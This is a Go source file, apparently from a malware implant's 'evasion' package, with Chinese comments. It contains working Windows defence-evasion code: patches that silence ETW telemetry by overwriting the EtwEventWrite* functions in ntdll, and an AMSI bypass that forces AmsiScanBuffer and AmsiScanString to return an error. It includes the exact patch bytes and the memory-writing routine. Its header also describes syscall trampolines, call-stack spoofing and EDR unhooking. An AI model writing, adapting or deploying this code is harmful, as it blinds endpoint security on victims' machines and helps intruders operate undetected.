//go:build windows

// Package evasion 主机层对抗（Windows）：
//  1. ETW Patch：把 ntdll 里全部 EtwEventWrite* 入口改成"返回 0"，消除进程 ETW 遥测
//  2. AMSI Bypass：patch amsi!AmsiScanBuffer/AmsiScanString 返回 E_INVALIDARG
//  3. 直接/间接 Syscall：从 ntdll 解析 syscall 号（SSN），构建 trampoline 执行，
//     绕过 ntdll 函数体开头的 EDR userland hook（direct：自建 syscall 指令；
//     indirect：跳回 ntdll 内的 syscall 指令，返回地址落在 ntdll 内，规避调用方检查）
//  4. 调用栈伪造：direct syscall 时把返回地址伪造成 BaseThreadInitThunk+0x14
//  5. 睡眠期模块摘链：睡眠窗口内把自身从 PEB 三条模块链表摘掉，醒来挂回
//  6. unhook：用磁盘副本 + 重定位重建可执行节，逐字节抹掉内联 hook
package evasion

import (
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"implant/core/config"
)

// Init 按配置执行对抗初始化（无配置项时静默返回）。
//
// **顺序有讲究**：unhook 必须在 ETW/AMSI patch 之前。unhook 是拿磁盘副本恢复
// ntdll/kernel32/kernelbase 的可执行节 —— 如果先打了 ETW/AMSI 补丁，接着 unhook
// 会用磁盘上的原始字节把刚打的补丁盖回去，最后得到"补丁报告说成功、实际已失效"
// 的载荷。反过来先 unhook 再打补丁，两个动作互不干扰。
func Init(etwOn, amsiOn bool, syscallMode string) error {
	// 1. 先摘掉 EDR 的内联 hook（若启用）
	if config.UnhookOnStartEnabled() {
		if reps, err := UnhookAll(); err != nil {
			debug("启动期 unhook 失败: %v", err)
		} else {
			for _, r := range reps {
				debug("unhook %s: %s", r.Module, r.String())
			}
		}
	}
	if etwOn {
		if rep, err := PatchETW(); err != nil {
			debug("ETW patch 失败: %v (已 patch: %v)", err, rep.Patched())
		}
	}
	if amsiOn {
		if rep, err := PatchAMSI(); err != nil {
			debug("AMSI patch 失败: %v (已 patch: %v)", err, rep.Patched())
		}
	}
	if syscallMode != "none" {
		if err := PrepareTrampolines(syscallMode); err != nil {
			return fmt.Errorf("syscall trampoline 初始化失败: %v", err)
		}
	}
	return nil
}

func debug(format string, args ...interface{}) {
	// 静默模式重定向后输出不可见；保留给 verbose 构建
	fmt.Printf(format+"\n", args...)
}

// ===== 通用内存 patch =====

// patchBytes 将 proc 指向的机器码起始 len(patch) 字节覆盖为 patch（可执行内存写）。
func patchBytes(proc uintptr, patch []byte) error {
	if proc == 0 {
		return errors.New("目标函数地址为空")
	}
	var oldProtect uint32
	if err := windows.VirtualProtect(proc, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect 失败: %v", err)
	}
	defer windows.VirtualProtect(proc, uintptr(len(patch)), oldProtect, &oldProtect)
	dst := (*[1 << 20]byte)(unsafe.Pointer(proc))
	for i, b := range patch {
		dst[i] = b
	}
	return nil
}

// ===== patch 报告 =====
// 单个目标失败不该让整组失败：EDR 可能只 hook 了其中一个入口，
// 或者某个导出在当前 Windows 版本上不存在。逐个记账，调用方能看到"哪些真的改到了"。

// PatchTarget 单个 patch 目标的记账
type PatchTarget struct {
	Name string
	Addr uintptr
	Err  error
}

// PatchReport 一组 patch 的结果
type PatchReport struct {
	Module  string
	Targets []PatchTarget
}

// Patched 返回成功的导出名
func (r PatchReport) Patched() []string {
	var out []string
	for _, t := range r.Targets {
		if t.Err == nil && t.Addr != 0 {
			out = append(out, t.Name)
		}
	}
	return out
}

// Failed 返回失败项
func (r PatchReport) Failed() []PatchTarget {
	var out []PatchTarget
	for _, t := range r.Targets {
		if t.Err != nil {
			out = append(out, t)
		}
	}
	return out
}

// String 一行摘要
func (r PatchReport) String() string {
	return fmt.Sprintf("%s: patched=%v failed=%d", r.Module, r.Patched(), len(r.Failed()))
}

// patchExports 逐个解析并 patch；全部失败才算失败（返回第一条错误）。
func patchExports(dll string, names []string, patch []byte, loadIfMissing bool) (PatchReport, error) {
	rep := PatchReport{Module: dll}
	lib := windows.NewLazySystemDLL(dll)
	var firstErr error
	for _, name := range names {
		proc := lib.NewProc(name)
		if err := proc.Find(); err != nil {
			if loadIfMissing {
				if _, lerr := windows.LoadDLL(dll); lerr != nil {
					rep.Targets = append(rep.Targets, PatchTarget{Name: name, Err: lerr})
					if firstErr == nil {
						firstErr = fmt.Errorf("%s 未加载且无法加载: %v", dll, lerr)
					}
					continue
				}
				lib = windows.NewLazySystemDLL(dll)
				proc = lib.NewProc(name)
			}
			if err := proc.Find(); err != nil {
				rep.Targets = append(rep.Targets, PatchTarget{Name: name, Err: err})
				if firstErr == nil {
					firstErr = fmt.Errorf("解析 %s!%s 失败: %v", dll, name, err)
				}
				continue
			}
		}
		addr := proc.Addr()
		if err := patchBytes(addr, patch); err != nil {
			rep.Targets = append(rep.Targets, PatchTarget{Name: name, Addr: addr, Err: err})
			if firstErr == nil {
				firstErr = fmt.Errorf("patch %s!%s 失败: %v", dll, name, err)
			}
			continue
		}
		rep.Targets = append(rep.Targets, PatchTarget{Name: name, Addr: addr})
	}
	return rep, firstErr
}

// ===== ETW Patch =====
// 覆盖 ntdll 全部事件写入入口：只 patch EtwEventWrite 会漏掉直接调 EtwEventWriteFull /
// EtwEventWriteString 的 provider（.NET、部分 DC/浏览器代码都这么做）。
// 首字节替换为 mov eax, 0; ret：返回 STATUS_SUCCESS 但不写任何事件。
var patchEtwWrite = []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}

// etwPatchTargets ntdll 里需要 patch 的导出（顺序即 patch 顺序）
var etwPatchTargets = []string{
	"EtwEventWrite",
	"EtwEventWriteEx",
	"EtwEventWriteFull",
	"EtwEventWriteString",
	"EtwEventWriteTransfer",
}

// PatchETW patch ntdll 的 ETW 事件写入入口组。
func PatchETW() (PatchReport, error) {
	rep, err := patchExports("ntdll.dll", etwPatchTargets, patchEtwWrite, false)
	if err != nil {
		return rep, err
	}
	// 至少改到一个才算成功（不同 Windows 版本导出的入口数量不同）
	if len(rep.Patched()) == 0 {
		return rep, errors.New("没有任何 ETW 入口被 patch")
	}
	return rep, nil
}

// ===== AMSI Bypass =====
// AmsiScanBuffer / AmsiScanString 首字节替换为 mov eax, 0x80070057; ret（E_INVALIDARG）。
// 两个都 patch：有的宿主只调 ScanString（它内部会调 ScanBuffer，但反过来不成立，
// 且 EDR 常在两者上都下钩子，只改一个会留下可见的另一半）。
var patchAmsi = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

// amsiPatchTargets amsi.dll 里需要 patch 的导出
var amsiPatchTargets = []string{"AmsiScanBuffer", "AmsiScanString"}

// PatchAMSI patch amsi.dll 的扫描入口组（未加载时尝试加载）。
func PatchAMSI() (PatchReport, error) {
	rep, err := patchExports("amsi.dll", amsiPatchTargets, patchAmsi, true)
	if err != nil {
		return rep, err
	}
	if len(rep.Patched()) == 0 {
		return rep, errors.New("没有任何 AMSI 入口被 patch")
	}
	return rep, nil
}

// VerifyPatch 读回目标前 len(want) 字节，确认 patch 真的落在了预期位置。
// 存在的意义：VirtualProtect 成功但写错地址这类错误，只有读回才能发现。
func VerifyPatch(addr uintptr, want []byte) bool {
	if addr == 0 || len(want) == 0 {
		return false
	}
	got := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(want))
	for i, b := range want {
		if got[i] != b {
			return false
		}
	}
	return true
}
